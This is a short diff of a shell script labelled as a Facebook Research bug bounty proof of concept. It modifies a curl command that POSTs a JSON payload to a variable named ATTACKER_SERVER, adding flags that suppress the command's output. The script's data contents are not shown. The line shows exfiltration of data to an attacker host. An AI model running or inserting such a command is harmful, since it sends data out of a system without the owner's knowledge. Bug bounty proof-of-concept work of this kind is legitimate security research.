@@ -19,6 +19,6 @@ DATA=$(cat <<EOF
 EOF
 )
 
-curl -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"
+curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"
 
 echo "FacebookResearch Bugbounty POC"
